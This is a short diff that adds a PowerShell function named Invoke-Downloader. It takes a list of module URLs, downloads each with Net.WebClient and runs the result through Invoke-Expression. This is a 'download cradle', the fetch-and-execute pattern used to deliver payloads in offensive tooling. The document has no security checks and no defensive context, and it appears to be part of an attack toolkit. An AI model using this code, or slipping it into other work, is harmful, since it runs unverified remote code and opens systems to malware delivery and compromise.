@@ -1,0 +1,10 @@
+Function Invoke-Downloader
+{
+PARAM ($modules)
+$downloadcradle = New-Object Net.WebClient
+    ForEach ($module in $modules)
+    {
+    $command = $($downloadcradle).DownloadString($($module))
+    Invoke-Expression $command
+    }
+}
